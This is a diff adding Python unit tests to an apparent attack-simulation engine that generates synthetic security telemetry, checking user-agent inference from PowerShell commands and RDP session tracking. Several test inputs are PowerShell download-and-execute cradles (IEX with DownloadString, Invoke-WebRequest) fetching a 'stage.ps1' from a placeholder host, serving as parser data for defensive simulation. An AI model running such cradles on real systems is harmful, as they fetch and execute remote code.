@@ -322,6 +322,49 @@ class TestStorylineCommandNetworks:
 
         assert url == "https://cdn.example.test/stage.ps1"
 
+    def test_webclient_command_default_omits_http_user_agent(self):
+        user_agent = StorylineMixin._storyline_http_user_agent_for_command(
+            system=None,
+            process_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                '"IEX (New-Object Net.WebClient).DownloadString('
+                "'https://cdn.example.test/stage.ps1')\""
+            ),
+            rng=random.Random(1),
+        )
+
+        assert user_agent == ""
+
+    def test_webclient_command_preserves_explicit_http_user_agent(self):
+        user_agent = StorylineMixin._storyline_http_user_agent_for_command(
+            system=None,
+            process_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                '"$wc = New-Object Net.WebClient; '
+                "$wc.Headers.Add('User-Agent','StageClient/2.0'); "
+                "$wc.DownloadString('https://cdn.example.test/stage.ps1')\""
+            ),
+            rng=random.Random(1),
+        )
+
+        assert user_agent == "StageClient/2.0"
+
+    def test_invoke_webrequest_command_uses_powershell_user_agent(self):
+        user_agent = StorylineMixin._storyline_http_user_agent_for_command(
+            system=None,
+            process_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                "\"Invoke-WebRequest -Uri 'https://cdn.example.test/stage.ps1' "
+                '-UseBasicParsing"'
+            ),
+            rng=random.Random(1),
+        )
+
+        assert user_agent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1"
+
     def test_extract_http_url_skips_oversized_encoded_command(self, monkeypatch):
         def fail_b64decode(*args: Any, **kwargs: Any) -> bytes:
             raise AssertionError("oversized EncodedCommand token should not be decoded")
@@ -2851,6 +2894,47 @@ class TestStorylineCommandSideEffects:
         assert conn["hostname"] == "cdn-assets-update.com"
         assert conn["preserve_dst_ip"] is True
 
+    def test_process_url_network_uses_webclient_source_native_user_agent(self):
+        source = System(
+            hostname="DC-01",
+            ip="10.10.2.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="alice",
+            full_name="Alice Example",
+            email="alice@example.com",
+        )
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source], service_accounts=[])
+        )
+        engine.state_manager = _FakeStateManager()
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                "powershell.exe -NoProfile -Command "
+                '"IEX (New-Object Net.WebClient).DownloadString('
+                "'https://cdn.example.test/stage.ps1')\""
+            ),
+        )
+
+        engine._execute_typed_event(
+            spec=spec,
+            actor=actor,
+            system=source,
+            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
+            activity="download stage",
+            explicit_types={"process"},
+        )
+
+        conn = engine.activity_generator.connections[-1]
+        assert conn["http"].user_agent == ""
+
     def test_connection_ground_truth_uses_generator_effective_destination(self):
         source = System(
             hostname="SRC",
@@ -2904,6 +2988,130 @@ class TestStorylineCommandSideEffects:
         assert event["dst_ip"] == "23.45.158.140"
         assert event["uid"] == "Cscptransfer00001"
         assert engine.activity_generator.connections[0]["dst_ip"] == "93.184.216.34"
+
+    def test_typed_rdp_session_registers_logon_for_follow_on_processes(self):
+        """Processes after a typed RDP event should reuse that session ownership."""
+        source = System(
+            hostname="WS-MCHEN-01",
+            ip="10.10.1.31",
+            os="Windows 11 Enterprise",
+            type="workstation",
+        )
+        target = System(
+            hostname="DC-01",
+            ip="10.10.0.10",
+            os="Windows Server 2022",
+            type="domain_controller",
+        )
+        actor = User(
+            username="marcus.chen",
+            full_name="Marcus Chen",
+            email="marcus.chen@example.local",
+        )
+        session_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
+        session_ready_time = session_time + timedelta(seconds=3)
+        session = SimpleNamespace(
+            username=actor.username,
+            system=target.hostname,
+            logon_id="0xrdp",
+            logon_type=10,
+            source_ip=source.ip,
+            start_time=session_ready_time,
+            source_ready_time=session_ready_time,
+            network_close_time=session_time + timedelta(minutes=30),
+            session_kind="rdp",
+        )
+
+        class _FakeWorldModel:
+            def system_for_ip(self, ip: str) -> System | None:
+                return source if ip == source.ip else None
+
+            def plan_session(self, *args: Any, **kwargs: Any) -> SimpleNamespace:
+                return SimpleNamespace(session_kind="rdp")
+
+        class _FakeWorldPlanner:
+            def __init__(self, state_manager: _FakeStateManager) -> None:
+                self.state_manager = state_manager
+                self.bootstrap_calls: list[dict[str, Any]] = []
+                self.ensure_calls: list[dict[str, Any]] = []
+
+            def bootstrap_user_session(self, **kwargs: Any) -> SimpleNamespace:
+                self.bootstrap_calls.append(kwargs)
+                self.state_manager.sessions[session.logon_id] = session
+                return SimpleNamespace(session=session, network_uid="Crdp00000000001")
+
+            def ensure_user_session(self, *args: Any, **kwargs: Any) -> SimpleNamespace:
+                self.ensure_calls.append({"args": args, "kwargs": kwargs})
+                replacement = SimpleNamespace(
+                    username=actor.username,
+                    system=target.hostname,
+                    logon_id="0xduplicate",
+                    logon_type=10,
+                    source_ip=source.ip,
+                    start_time=kwargs.get("time", session_time),
+                    network_close_time=session_time + timedelta(minutes=30),
+                    session_kind="rdp",
+                )
+                self.state_manager.sessions[replacement.logon_id] = replacement
+                return replacement
+
+        state_manager = _FakeStateManager()
+        planner = _FakeWorldPlanner(state_manager)
+        engine = object.__new__(StorylineMixin)
+        engine.scenario = SimpleNamespace(
+            environment=SimpleNamespace(systems=[source, target], service_accounts=[])
+        )
+        engine.state_manager = state_manager
+        engine.activity_generator = _FakeActivityGenerator()
+        engine.dispatcher = SimpleNamespace(visibility_engine=None)
+        engine.world_model = _FakeWorldModel()
+        engine.world_planner = planner
+
+        rdp_spec = SimpleNamespace(type="rdp_session", source_ip=source.ip)
+        process_spec = SimpleNamespace(
+            type="process",
+            process_name=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell.exe -NoProfile Get-Process",
+        )
+
+        event = engine._execute_typed_event(
+            spec=rdp_spec,
+            actor=actor,
+            system=target,
+            time=session_time,
+            activity="open remote desktop session",
+            explicit_types={"rdp_session"},
+        )
+        requested_process_time = session_time + timedelta(seconds=1)
+        process_time = engine._apply_storyline_shell_availability(
+            actor=actor,
+            system=target,
+            time=requested_process_time,
+            rng=random.Random(1),
+        )
+        engine._execute_typed_event(
+            spec=process_spec,
+            actor=actor,
+            system=target,
+            time=process_time,
+            activity="run remote command in the RDP session",
+            explicit_types={"process"},
+        )
+
+        assert event is not None
+        assert event["uid"] == "Crdp00000000001"
+        assert planner.bootstrap_calls[0]["session_kind"] == "rdp"
+        assert process_time > session_ready_time
+        assert planner.ensure_calls == []
+        assert engine.activity_generator.processes[-1]["logon_id"] == "0xrdp"
+        assert (
+            engine._last_storyline_logon_by_actor_system[(actor.username, target.hostname)]
+            == "0xrdp"
+        )
+        assert (
+            engine._last_storyline_logon_source_by_actor_system[(actor.username, target.hostname)]
+            == source.ip
+        )
 
     def test_recent_psexesvc_service_runs_follow_on_commands_as_system(self):
         source = System(
